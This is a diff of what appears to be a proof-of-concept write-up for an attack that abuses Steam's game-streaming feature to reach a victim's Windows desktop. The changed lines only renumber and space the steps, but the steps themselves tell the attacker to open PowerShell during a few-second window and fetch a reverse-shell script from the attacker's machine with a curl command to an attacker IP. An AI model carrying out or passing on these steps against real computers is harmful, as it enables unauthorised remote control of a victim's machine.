@@ -93,9 +93,12 @@ s.close()
 
 If he already connects to the victim's machine, do step 6. If he freezes, do step 12. If he logs in and out, do step 6)
 6. Click on the "Stream" button (Since I'm Brazilian and use the translated version of Steam, I'm not sure of the exact name of the button in English, but I demonstrate it in the video. I apologize for this detail.).
-8. Once the game streaming begins, access to the Windows machine is possible.
-9. If the Windows machine appears, take advantage of this brief window to open PowerShell (you have approximately 3 to 10 seconds to do this). Use the shortcut "Windows+R," type "powershell.exe," and press Enter.
-10. With PowerShell open, download the reverse shell file from the attacker's machine using the following command:
+
+7. Once the game streaming begins, access to the Windows machine is possible.
+   
+8. If the Windows machine appears, take advantage of this brief window to open PowerShell (you have approximately 3 to 10 seconds to do this). Use the shortcut "Windows+R," type "powershell.exe," and press Enter.
+   
+9. With PowerShell open, download the reverse shell file from the attacker's machine using the following command:
 
 ```shell
 curl http://attacker_ip/client.py -o client.py
